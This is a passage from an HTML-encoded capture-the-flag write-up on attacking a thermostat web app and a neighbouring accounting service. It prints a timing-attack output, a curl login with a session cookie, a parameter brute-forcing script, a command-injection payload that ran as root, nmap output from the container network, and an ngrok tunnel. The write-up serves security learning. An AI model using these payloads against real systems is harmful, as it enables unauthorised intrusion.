\u003c/span\u003e12.179362773895264\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a2\nFound Byte 50 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e12.572036743164062\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250\nFound Byte bc with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e13.273049354553223\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bc\nFound Byte bd with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e13.617496967315674\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbd\nFound Byte e7 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e14.13040566444397\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7\nFound Byte 53 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e14.593729496002197\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753\nFound Byte f5 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e15.0700101852417\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5\nFound Byte db with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e15.664264917373657\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db\nFound Byte 13 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e16.164478063583374\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13\nFound Byte d8 with \u003cspan class=\"nb\"\u003etime \u003c/span\u003e16.67181408072168\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTrying the hash on the website gives us the session cookie to login!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ecurl \u003cspan class=\"s1\"\u003e\u0026#39;http://104.196.12.98/\u0026#39;\u003c/span\u003e \u003cspan class=\"nt\"\u003e--data\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;hash=f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e-vvv\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e   Trying 104.196.12.98...\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e TCP_NODELAY \u003cspan class=\"nb\"\u003eset\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connected to 104.196.12.98 \u003cspan class=\"o\"\u003e(\u003c/span\u003e104.196.12.98\u003cspan class=\"o\"\u003e)\u003c/span\u003e port 80 \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"c\"\u003e#0)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e POST / HTTP/1.1\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Host: 104.196.12.98\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e User-Agent: curl/7.58.0\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Accept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Content-Length: 69\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e Content-Type: application/x-www-form-urlencoded\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e upload completely sent off: 69 out of 69 bytes\n\u0026lt; HTTP/1.1 302 FOUND\n\u0026lt; Server: nginx/1.15.8\n\u0026lt; Date: Mon, 11 Mar 2019 15:48:54 GMT\n\u0026lt; Content-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u0026lt; Content-Length: 217\n\u0026lt; Connection: keep-alive\n\u0026lt; Location: http://104.196.12.98/main\n\u0026lt; Cache-Control: public, max-age\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\n\u0026lt; Pragma: no-cache\n\u0026lt; Expires: 0\n\u0026lt; Vary: Cookie\n\u0026lt; Set-Cookie: \u003cspan class=\"nv\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eeyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\n\u0026lt;\n\u0026lt;\u003cspan class=\"o\"\u003e!\u003c/span\u003eDOCTYPE HTML PUBLIC \u003cspan class=\"s2\"\u003e\u0026quot;-//W3C//DTD HTML 3.2 Final//EN\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt;\n\u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt;\n\u003cspan class=\"k\"\u003e*\u003c/span\u003e Connection \u003cspan class=\"c\"\u003e#0 to host 104.196.12.98 left intact\u003c/span\u003e\n\u0026lt;p\u0026gt;You should be redirected automatically to target URL: \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;/main\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e/main\u0026lt;/a\u0026gt;.  If not click the link.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-5-command-injection\"\u003eStage 5 - Command Injection\u003c/h2\u003e\n\n\u003cp\u003eOnce we login, we\u0026#39;re presented with a control panel for the thermostat with three links (one hidden).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;li\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/control\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eTemperature control\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;li\u0026gt;\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/update\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eCheck for updates\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"c\"\u003e\u0026lt;!--\u0026lt;li\u0026gt;\u0026lt;a href=\u0026quot;/diagnostics\u0026quot;\u0026gt;Diagnostics\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;--\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe Temperature control allows us to set the temperature, which doesn\u0026#39;t seem interesting. The Diagnostics page just returns forbidden,\u003cbr\u003e\nso that is something we might have to access through some other means. The most interesting page is the Update page. It outputs:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eConnecting to http://update.flitethermostat:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis points towards something similar to a SSRF, but we need to figure out how to control the parameters, i.e the URL and the port.\u003cbr\u003e\nAfter playing around a bit with the URL and the parameters, I discovered that \u003ccode\u003eport\u003c/code\u003e param in the GET request allows us to change the\u003cbr\u003e\nport that the server connects to. However, this didn\u0026#39;t help that much as it was converted to an int in the backend, and if you sent a string,\u003cbr\u003e\nit would throw an Internal Server Error.\u003c/p\u003e\n\n\u003cp\u003eI was stuck for a long time at this point, trying various parameter names, until I saw the tweet from Cody, which was an underscore. I figured that\u003cbr\u003e\nthe param that controlled the host might be two letter word joined by underscores. I wrote a script that used a\u003cbr\u003e\n\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fdanielmiessler%2FSecLists%2Fblob%2Fmaster%2FDiscovery%2FWeb-Content%2Fburp-parameter-names.txt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eBurp Parameter Wordlist\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and tried all the different combinations\u003cbr\u003e\nuntil it found something that changed the URL.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests_futures.sessions\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFuturesSession\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003esession\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFuturesSession\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emax_workers\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e32\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;burp-parameter-names.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrip\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003edefault_data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;http://104.196.12.98/update\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edefault_data\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eparam_requests\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\u003cspan class=\"n\"\u003eN\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eN\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ej\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"nb\"\u003erange\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ep1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ep2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ej\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecurr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;http://104.196.12.98/update?\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ep1\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;=80\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eparam_requests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003ep1\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep2\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecurr\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecurr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;http://104.196.12.98/update?\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nb\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ep2\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;=80\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;eyJsb2dnZWRJbiI6dHJ1ZX0.XIaDZg.P26g9dbuNlBlDBMSxlqQ785TGiY\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e})\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eparam_requests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eappend\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003ep2\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;_\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ep1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecurr\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eresp\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eparam_requests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eres\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eresp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003edefault_data\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estatus_code\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ep\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estatus_code\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eres\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\n    \u003cspan class=\"n\"\u003eparam_requests\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[]\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter letting it run for a couple of minutes, it found the magic param: \u003ccode\u003eupdate_host\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eNow that I could control both the host and the port, I tried to point the update to localhost and try to access the\u003cbr\u003e\nforbidden diagnostics page. However, nothing seemed to be working. I also tried doing a port scan, but that didn\u0026#39;t find anything as well.\u003c/p\u003e\n\n\u003cp\u003eAfter giving up on SSRF, I tried doing a command injection, and that worked!\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# http://104.196.12.98/update?update_host=127.0.0.1:$(id)/\nConnecting to http://127.0.0.1:uid=0(root) gid=0(root) groups=0(root)/:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUsing the command injection, I got a reverse shell back to my server, and searched through the system. The app was running in a docker container\u003cbr\u003e\nand I didn\u0026#39;t find anything interesting except the source code of the app, where I found a number of red herrings ;)\u003c/p\u003e\n\n\u003cp\u003eNext, I tried to scan the network that the docker instance was running on.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@b60da3a618c2:/app# ip a\n1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n188: eth0@if189: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default\n    link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n\nroot@b60da3a618c2:/app# nmap 172.27.0.0/24\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-11 16:16 UTC\nNmap scan report for 172.27.0.1\nHost is up (0.00011s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:42:DE:7A:10:86 (Unknown)\n\nNmap scan report for flitectf_accounting_1.flitectf_default (172.27.0.2)\nHost is up (0.00015s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 02:42:AC:1B:00:02 (Unknown)\n\nNmap scan report for b60da3a618c2 (172.27.0.3)\nHost is up (0.000010s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap done: 256 IP addresses (3 hosts up) scanned in 103.50 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eVisiting \u003ca title=\"http://172.27.0.2\" href=\"/redirect?url=http%3A%2F%2F172.27.0.2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://172.27.0.2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e we come across a new service.\u003c/p\u003e\n\n\u003ch2 id=\"stage-6-local-file-inclusion\"\u003eStage 6 - Local File Inclusion\u003c/h2\u003e\n\n\u003cp\u003eFirst I tried to set up a proxy so that I could access the website normally, and play around with it. To do this, I downloaded ngrok\u003cbr\u003e\nand reverse proxied the website to a publically accessible domain.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eroot@b60da3a618c2:/tmp# ./ngrok http 172.27.0.2:80\nngrok by @inconshreveable            (Ctl+C to quit)\n\nngrok does not support a dynamic, color terminal UI on solaris.\nAccess the web interface for connection and tunnel status.\n\nVersion                       2.3.15\nRegion                        United States (us)\nWeb Interface                 http://127.0.0.1:4040\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn the website, there were two tabs: Invoices and Reports, both of which were protected by login.\u003cbr\u003e\nOn the Invoices page, there was a hidden link in the source to a page to create a new invoice.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eHome\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/reports\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eReports\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/li\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;li\u003c/span\u003e  \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-item active\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nav-link\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;/invoices\u0026quot;\u003c/span\u003e\u003cspan 